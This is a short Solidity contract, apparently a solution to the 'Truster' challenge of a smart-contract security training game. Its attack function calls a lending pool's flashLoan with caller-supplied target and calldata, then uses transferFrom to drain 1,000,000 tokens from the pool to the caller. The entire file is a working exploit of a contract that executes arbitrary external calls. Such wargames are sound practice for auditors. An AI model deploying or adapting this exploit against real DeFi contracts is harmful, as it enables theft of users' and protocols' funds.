// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterAttack {
    TrusterLenderPool immutable pool;
    IERC20 immutable token;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function attack(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        pool.flashLoan(borrowAmount, borrower, target, data);
        token.transferFrom(address(pool), msg.sender, 1000000 ether);
    }
}
